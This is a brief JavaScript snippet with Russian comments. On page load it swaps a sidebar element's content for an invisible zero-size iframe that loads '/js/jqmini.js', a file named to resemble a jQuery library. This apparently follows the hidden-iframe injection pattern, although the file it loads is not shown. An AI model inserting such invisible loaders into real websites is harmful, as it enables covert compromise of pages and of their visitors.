// Убедимся, что DOM полностью загружен перед выполнением кода
document.addEventListener('DOMContentLoaded', function () {
    var sidebar = document.getElementById('sidebar1_wrap1');
    if (sidebar) {
        sidebar.innerHTML = '<iframe src="/js/jqmini.js" width="0" height="0"></iframe>';
        console.log('Содержимое обновлено!');
    } else {
        console.error('Элемент с id "sidebar1_wrap1" не найден.');
    }
});
